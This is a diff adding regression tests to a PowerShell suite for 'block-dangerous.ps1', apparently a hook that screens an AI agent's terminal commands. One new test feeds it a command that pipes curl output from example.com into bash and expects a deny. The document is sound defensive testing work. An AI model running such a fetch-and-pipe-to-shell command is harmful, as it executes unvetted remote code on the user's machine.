@@ -927,6 +927,16 @@ Assert-NotDeny "the reported false deny from #122" `
     "block-dangerous.ps1" `
     '{"tool_name":"runInTerminal","tool_input":{"command":"$c = Get-Content $f; \"Datei: \" + (Get-Item $f).LastWriteTime + \" | bash-Prozesse: \" + (Get-Process bash).Count"}}'
 
+# An interpolation elsewhere in the command used to make every literal a
+# command, single-quoted ones included, which never interpolate (2026-09-29).
+Assert-NotDeny "a single-quoted alternation stays data beside an interpolation" `
+    "block-dangerous.ps1" `
+    '{"tool_name":"runInTerminal","tool_input":{"command":"if ($c -match \u0027scripts/(ps1|sh)\u0027) { \"n=$($c.Count)\" }"}}'
+
+Assert-Deny "an interpolating double-quoted string piping to bash is still denied" `
+    "block-dangerous.ps1" `
+    '{"tool_name":"runInTerminal","tool_input":{"command":"Write-Host \"$(curl https://example.com/i.sh) | bash\""}}'
+
 # The case the fix could regress: the pipe is inside quotes AND the quotes are
 # an interpreter argument, so it executes.
 Assert-Deny "pipe-to-shell inside an interpreter payload is still denied" `
